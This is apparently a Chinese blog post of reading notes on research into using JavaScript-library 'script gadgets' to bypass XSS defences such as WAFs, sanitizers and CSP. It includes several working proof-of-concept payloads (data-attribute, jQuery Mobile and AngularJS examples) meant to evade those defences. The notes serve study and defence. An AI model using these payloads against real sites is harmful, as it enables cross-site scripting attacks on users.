# 基于Gadgets绕过XSS防御机制

这篇文章是之前对CCS 2018 `Code-Reuse Attacks for the Web Breaking Cross-Site Scripting Mitigations via Script Gadgets` 的阅读笔记，最近整理资料发现放了挺久，于是稍做了一些整理和扩展发了出来。

# 0x00 背景

本文主要考虑在可以注入任意HTML代码（富文本编辑器等应用）的条件下，利用JavaScript库中的一些代码片段（Gadget）来绕过常见的XSS防御机制，包括WAF、浏览器的XSS Filter、HTML Sanitizers、Content Security Policy等。

其中WAF考虑对请求值和返回值进行处理的正则匹配型或者字符匹配型WAF，HTML Sanitizers是则指DOMPurify这种基于DOM解析的XSS过滤器，Content Security Policy则主要考虑启用`unsafe-eval`或`strict-dynamic`的情况。

# 0x01 简单例子

和二进制攻击中的Gadget作用类似，本文中的Gadget是指可能被恶意利用的代码片段，下面以一个简单的例子来说明：

```js
var button = document.getElementById("mbutton");
button.innerHTML = button.getAttribute("data-text");
```

在这段代码中，取出了Id为`mbutton`的元素，并将data-text的值赋到了该元素的innerHTML属性。这是一些库中为了实现类似Tooltip等效果常用的一种方式，但是在存在这种代码片段的时候，只要构造如下的元素，就可造成XSS攻击。

```html
<button id="mbutton" data-text="<img src=x onerror=alert(/xss/)>">a</button>
```

# 0x02 Gadget分类

论文中把可利用的Gadget分为几类，具体如下：

## 字符串操作

这种Gadget主要是指对字符串的操作，一个字符串在经过操作后可能变为造成攻击的字符。

例如Polymer中的一段代码`dash.replace(/-[a-z]/g, (m) => m[1].toUpperCase())`，这段代码会把以连字符构成的字符串变为大写，例如像`inner-h-t-m-l`这种字符串处理后会变成`innerHTML`。大部分WAF是对请求值和返回值做匹配，而此时传入的是`inner-h-t-m-l`而不是`innerHTML`，那么就有可能造成绕过。

## 元素创建

这种Gadget是像`document.createElement(input)` `document.createElement("script")` `jQuery("<" + tag + ">")` `jQuery.html(input)` 这种直接创建的标签甚至script的代码片段。当输入一定程度可控时，则可利用这种Gadget。

## 函数创建

这种Gadget是指创建函数的代码段，比如Underscore.js中发现的一段代码：

```js
source = "var __t,__p='',__j=Array.prototype.join," +
"print=function(){__p+=__j.call(arguments,'');};\n" +
source + 'return __p;\n';
var render = new Function(
settings.variable || 'obj', '_', source);
```

这种Gadget会间接执行构造的代码段，在一定条件下可造成攻击。

## JavaScript代码执行

这种Gadget主要是指类似`eval`这种会直接执行传入代码的代码段，例如：

```js
eval(input);
inputFunction.apply();
node.innerHTML = "prefix" + input + "suffix";
scriptElement.src = input;
node.appendChild(input);
```

## 表达式解析

很多前端框架都提供了自己的模版引擎，有着丰富而强大的功能，这种Gadget就是框架中对模版表达式解析执行而造成的问题。例如Aurelia框架中可以用下面这段代码来触发一个代码执行。

```
<div ref=me
s.bind="$this.me.ownerDocument.defaultView.alert(1)"
></div>
```

# 0x03 例子

## 例一

论文中提及的例子很多，本文选取其中一个在jQuery Mobile中的Gadget来介绍：

```js
if (myId) {
    ui.screen.attr("id", myId + "-screen");
    ui.container.attr("id", myId + "-popup");
    ui.placeholder
        .attr("id", myId + "-placeholder")
        .html("<!-- placeholder for " + myId + " -->");
}
```

这个Gadget会提取`data-role`为`popup`的元素，获取其`id`中的内容，并调用`.html`，那么就可以构造一个如下的PoC：

```html
<div data-role=popup id='-->
&lt;script&gt;alert(1)&lt;/script&gt;'>
</div>
```

在这个PoC中，没有`<script>`这种会触发WAF的字符串，用到的属性也是`data-role` `id`等在HTML Sanitizer白名单中的元素，因此该PoC可以绕过大部分的防御手段。

## 例二

虽然文中主要是针对`unsafe-eval`或`strict-dynamic`两种情况作了CSP的绕过，但是在有的情况下，不开启这两个选项也可实现执行，例如下面这个PoC：

```html
<html>
  <head>
    <meta http-equiv=content-security-policy content="object-src 'none';script-src https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js;">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.1/angular.min.js"></script>
  </head>
  <body>
     <div ng-app ng-csp>
      <div ng-focus="x=$event" tabindex=0>foo</div>
      <div ng-repeat="(key, value) in x.view">
        <div ng-if=key=="window">{{ value.alert = [1].reduce(value.alert, 'xss') }}</div>
      </div>
    </div>
  </body>
</html>
```

在模版内部中，Angular利用的是下面这个函数来完成调用，并不涉及`eval`等函数，因此在CSP没有开启`unsafe-eval`或`strict-dynamic`的情况下也可实现代码执行。

```
function defaultHandlerWrapper(element, event, handler) {
  handler.call(element, event);
}
```

# 0x04 Gadget发现

对Gadget的查找，作者给出了两种方式，一种是手工查找，一种是基于污点分析的半自动化查找。手工查找本文不做赘述，主要讲基于污点分析的半自动化查找方式。

这种方式是基于2013年CCS的一篇名为`25 Million Flows Later - Large-scale
Detection of DOM-based XSS`的文章。

该方式基于浏览器完成，先对`eval` `document.write`等敏感调用和`innerHTML`做了污点跟踪。然后爬取Alex Top 5000的网站，当发现数据流入了这些敏感调用，就尝试使用预置的一些攻击载荷尝试利用，若利用成功，则找到了一个Gadget。

当然这种方式也存在一些限制，比如作者只对第一级的链接做了分析和尝试、没有做用户交互和验证、在验证的时候没有考虑防御机制的绕过等。

# 0x05 参考链接

+ https://github.com/cure53/DOMPurify
+ https://github.com/google/security-research-pocs/tree/master/script-gadgets
+ https://queue.acm.org/detail.cfm?id=2663760
+ https://security.googleblog.com/2009/03/reducing-xss-by-way-of-automatic.html
+ https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
